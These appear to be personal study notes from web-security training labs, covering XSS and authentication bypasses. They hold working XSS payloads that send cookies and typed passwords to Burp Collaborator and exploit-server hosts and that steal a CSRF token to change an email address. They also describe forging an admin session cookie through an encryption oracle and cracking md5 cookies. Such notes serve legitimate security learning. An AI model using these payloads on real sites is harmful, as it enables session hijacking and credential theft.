## XSS Vulnerabilities:
- In the website field of comment: https://&apos;-alert()-&apos;
```
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)
fetch('https://burp-collaborator',{
method:'POST',
mode:'no-cors',
body:username.value+':'+this.value
});">
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
      var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
       var changeReq = new XMLHttpRequest();
       changeReq.open('post', '/my-account/change-email', true);
       changeReq.send('csrf='+token+'&email=test@test.com')
       };
    </script>
    
<><img src=1 onerror=alert() /> 
  
```

## Authentication Vulnerabilities
- ==Offline password cracking==
  Test the stay-logged-in function with the provided credentials and find that it is a base64 string consisting of the username and password hashed md5. 
- ==Authentication bypass via encryption oracle==
  The blog post email field can act as an encryption oracle. When entering an invalid email, it shows the invalid email on the page, and a "notification" cookie is generated. Taking the stay-logged in cookie into this notification cookie field and sending the request decrypts the ciphertext and reveals plaintext  username:timestamp. administrator:timestamp encrypted doesn't work, as it needs to be a multiple of 4 apparently, so pad it with random string like xxxxxxxxxadministrator:timestamp, encrypt it, then URL and Base64 decode and delete the first 32 bytes. Re-encode and use it as the Stay-logged in cookie to gain admin privileges



  XSS in the comment section
```
<script>document.location='https://exploit-exploit_id.exploit-server.net/'+document.cookie</script>
```  
  
  View the cookie of carlos and crack it to log in

